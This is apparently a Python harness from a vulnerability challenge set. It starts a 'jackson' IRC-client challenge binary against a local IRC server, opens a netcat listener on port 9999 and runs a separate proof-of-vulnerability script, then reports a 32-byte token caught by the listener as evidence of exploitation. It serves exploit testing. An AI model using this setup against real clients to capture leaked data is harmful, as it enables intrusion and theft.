import sys
import os
import select

from subprocess import Popen, PIPE

if __name__ == '__main__':

    print("INFO: Launching jackson. This PoV assumes that there is a running irc server on the host");
    jackson_env = os.environ

    if 'JACKSON' not in os.environ:
        print("[ERROR]: The JACKSON environment variable needs to be set to the location of the jackson CB")

    bin = jackson_env['JACKSON']
    jackson_env['HOST'] = 'localhost'
    jackson_env['PORT'] = '6667'

    jackson_proc = Popen([bin], shell=True, stdin=PIPE, stdout=PIPE, env = jackson_env)

    jackson_proc.stdin.write("/log\n")
    jackson_proc.stdin.flush()

    print("INFO: Logging turned on");

    jackson_proc.stdin.write("/connect localhost\n")
    jackson_proc.stdin.flush()

    print("INFO: Connected to the irc server\n");

    #### Setup the netcat listener
    nc_proc = Popen(['/bin/nc -l -p 9999'], shell=True, stdin=PIPE, stdout=PIPE, env = jackson_env)

    print ("INFO: netcat listener is launched" )
    print("INFO: The client is ready for the PoV")

    print("INFO: Launching the python poc")

    pov_proc = Popen(['python jackson-pov.py'], shell=True, stdin=PIPE, stdout=PIPE, env = jackson_env)

    poll_obj = select.poll()
    poll_obj.register(jackson_proc.stdout, select.POLLIN)
    poll_obj.register(nc_proc.stdout, select.POLLIN)

    select_attempts = 0
    while True:
        
        slist = select.select( [jackson_proc.stdout, nc_proc.stdout], [], [], 5)

        rlist = slist[0]

        if len(rlist) == 0:
            select_attempts += 1

        if select_attempts > 3:
            print("[ERROR] No data has been read in 15 seconds. The pov likely failed")
            pov_proc.kill()
            nc_proc.kill()
            os.system("pkill jackson")
            sys.exit()

        for r in rlist:
            if r == nc_proc.stdout:
                z = r.read(32)
                print("TOKEN: %s" %(z))
                sys.exit()
            else:
                y = r.readline()

                print y.rstrip("\n")

                if y.find('Nick chess already') != -1:
                    print("[ERROR] There are likely other jackson instances running. Kill them first")
                    sys.exit(0)


    

    